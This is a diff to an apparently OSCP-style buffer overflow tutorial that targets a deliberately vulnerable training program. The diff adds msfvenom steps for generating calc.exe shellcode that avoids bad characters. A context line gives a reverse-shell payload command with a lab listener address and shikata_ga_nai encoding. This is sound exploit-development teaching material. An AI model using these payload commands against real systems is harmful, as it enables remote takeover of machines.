@@ -46,6 +46,24 @@ Run `!mona jmp -r esp -cpb "\x00\x0A"` to identify which pointers do not have th
 At this point we might be in possesion of the correct JMP ESP address. If we want to check, we simply run `!mona find -s "\xff\xe4" -m dostackbufferoverflowgood.exe` directly on the identified vulnerable module.
 
 ## Generating shellcode
+Now it's time to come up with some interesting bytecode to put on the stack. Metasploit has a built-in tool called msfvenom that can produce shellcode for us.
+```
+msfvenom -p windows/exec --list-options
+```
+
+![](https://raw.githubusercontent.com/d15rup7or/OSCP-like-buffer-overflow/master/img/msfvenom%20-p%20windowsexec%20--list-options.PNG)
+
+For the purpose of the training, we will provide the following options to msfvenom:
+* -p windows/exec (we want Windows shellcode that will execute a command)
+* -b '\x00\x0A' (the list of bad characters we determined earlier, so that msfvenom can avoid having them in the generated shellcode
+* -f python (output shellcode in a Python-friendly format)
+* CMD=calc.exe EXITFUNC=thread (options for the windows/exec payload - in this case starting the calc.exe)
+
+```
+msfvenom -p windows/exec -b '\x00\x0A' \ -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
+```
+
+**** For reverse shell connection:
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.21.128 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a"
 ```
